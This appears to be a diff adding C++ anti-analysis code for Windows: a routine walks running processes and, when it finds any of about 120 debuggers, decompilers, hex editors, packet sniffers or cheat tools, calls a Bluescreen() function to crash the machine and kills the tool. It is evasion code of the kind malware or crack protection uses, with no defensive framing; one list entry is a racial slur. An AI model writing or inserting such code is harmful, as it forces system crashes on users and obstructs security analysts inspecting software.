@@ -1,0 +1,775 @@
+inline BOOL TerminateMyProcess(DWORD dwProcessId, UINT uExitCode)
+{
+	DWORD dwDesiredAccess = PROCESS_TERMINATE;
+	BOOL  bInheritHandle = FALSE;
+	HANDLE hProcess = OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
+	if (hProcess == NULL)
+		return FALSE;
+
+	BOOL result = TerminateProcess(hProcess, uExitCode);
+
+	CloseHandle(hProcess);
+
+	return result;
+}
+
+using namespace std;
+
+inline BOOL GetProcessList()
+{
+	HANDLE hProcessSnap;
+	HANDLE hProcess;
+	PROCESSENTRY32 pe32;
+	DWORD dwPriorityClass;
+
+	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hProcessSnap == INVALID_HANDLE_VALUE)
+	{
+		return(FALSE);
+	}
+
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+
+	if (!Process32First(hProcessSnap, &pe32))
+	{
+		CloseHandle(hProcessSnap);
+		return(FALSE);
+	}
+	do
+	{
+		string str(pe32.szExeFile);
+
+		if (str == "idaq.exe")
+		{
+
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "idaq64.exe")
+		{
+
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "depends.exe")
+		{
+
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "JustDecompile.exe")
+		{
+
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "WindowsDecompiler.exe")
+		{
+
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "W32dsm87.exe")
+		{
+
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "010Editor.exe")
+		{
+
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "dotfuscatorUI.exe")
+		{
+
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "HookShark64.exe")
+		{
+
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "x64Server.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "bintext.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "olly.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "Hexinator.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "ILSpy.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "exe2c_gui.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "relyze.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "HxD.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "pexplorer.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "Autoruns64.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "Fiddler.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "PYG_TOOLS_VER5.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "HookShark64.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "Window-Title-Changer.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "Procexp.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "ImmunityDebugger.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "Reko.Libraries.Python.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "OllyDbg.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "ollydbg.ini")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "idaw.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "idaw64.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "dbg.p64")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "IDA_ClassInformer_PlugIn.P64")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "ImmunityDebugger.ini")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "UpdateFiddler.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "pexdll2.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "pexgp.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "PngDistill.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "Zopfli.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "procdump64.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "procdump.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "010Editor.news")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "exe2c.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "depends.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "virustotal_detection.rb")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "x64dbg.rb")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "TCPView.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "TelerikJustDecompileCOM.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "JustDecompile.ShellExtension.v5.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "JustDecompile.API.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "luaclient-i386.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "ida64.wll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "idacolor.cf")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "ida64.int")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "ida.wll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "ida.key")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "ida.hlp")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "idahelp.chm")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "bc15owl.sig")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "idsnames")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "Wireshark.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "WinPcap_4_1_3.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "rawshark.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "WinSparkle.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "text2pcap.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "reordercap.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "wireshark-gtk.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "d3dcompiler_47.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "wimaxmacphy.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "editcap.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "Qt5Widgets.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "dumpcap.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "capinfos.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "mergecap.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "ACCOUNTING-FRAMEWORK-PIB")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "tshark.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "gtkrc")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "010Editor.qhc")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "speedhack-x86_64.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "vehdebug-i386.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "vehdebug-x86_64.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "main.lua")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "LLVMRelyze.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "defines.lua")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "CESigMaker_[unknowncheats.me]_.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "Honoka.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "umstealthedit-i386.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "umstealthedit-x86_64.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "stealtheditscript.lua")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "seworker-x86_64.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "seworker-i386.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "niggaengine")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "luaclient-x86_64.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "standalonephase1.dat")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "standalonephase2.dat")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "DotNetDataCollector64.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "snowman.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "Hopper.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "hopper_api.py")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "HopperCore.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "gnustep-gui-0_22.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "OllyICE.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "OllyDBG.EXE")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "krmem.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "XIdt.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "HideToolz.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "OllyDump.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "OllyMachine.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "OllyScript.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "pexdll.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "unupx.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "Reko.Core.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "decompile.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "HideDebugger.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "IDAStealth.plw")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "TitanHide.sys")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "TitanHideGUI.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "TitanHideTest.exe")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "TitanHide.dll")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "SwissArmyKnife.dp64")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+		if (str == "SwissArmyKnife.dp32")
+		{
+			Bluescreen();
+			TerminateMyProcess(pe32.th32ProcessID, 1);
+		}
+
+	} while (Process32Next(hProcessSnap, &pe32));
+
+	CloseHandle(hProcessSnap);
+	return(TRUE);
+}
